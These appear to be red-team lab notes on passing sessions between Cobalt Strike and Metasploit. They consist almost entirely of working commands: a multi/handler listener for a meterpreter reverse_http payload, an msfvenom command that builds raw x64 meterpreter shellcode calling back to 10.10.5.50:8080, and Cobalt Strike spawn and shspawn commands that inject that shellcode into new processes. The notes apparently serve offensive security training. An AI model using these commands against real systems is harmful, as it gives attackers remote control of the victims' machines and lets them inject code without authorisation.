# Session Passing Notes

The spawn command will spawn an x86 or x64 process and inject shellcode for the specified listener into it.
```
spawn x64 http
```

**Foreign Listener**

using msf
```
sudo msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set LHOST ens5
set LPORT 8080
run
```

In CS
- Create a new Foreign HTTP listener with same host and port as above

Now we can use spawn, jump, or elevate with this listener

**Spawn and Inject**

in msf with the above 
```
set payload windows/x64/meterpreter_reverse_http
set LHOST 10.10.5.50
set LPORT 8080
run
```

Make msfvenom payload
```
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=10.10.5.50 LPORT=8080 -f raw -o /mnt/c/Payloads/msf_http_x64.bin
```

In CS beacon, this will create a callback for msf
```
shspawn x64 C:\Payloads\msf_http_x64.bin
```
